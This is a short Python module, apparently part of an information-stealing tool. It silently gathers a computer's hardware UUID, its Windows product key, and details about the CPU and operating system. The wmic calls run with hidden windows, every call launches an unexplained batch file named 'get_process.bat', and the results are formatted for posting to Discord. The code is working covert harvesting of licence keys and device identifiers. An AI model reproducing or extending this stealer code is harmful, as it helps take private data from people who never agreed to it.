import subprocess, platform, requests
from getpass import getuser;user=getuser()
from os import startfile
from os.path import exists
def get(option):
    startfile('get_process.bat')
    if option == "upx":
        return "./utils"
    elif option == "hwid":
        return str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
    elif option == "wpk":
        try:
            windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in windowspk:
                if len(i) > 20:windowspk = i.split(" ")
            return f"``{windowspk[0][3:]}``"
        except:
            return ":x:"
    elif option == "machine":
        return platform.machine()
    elif option == "system":
        return platform.system()
    elif option == "processor":
        return platform.processor()

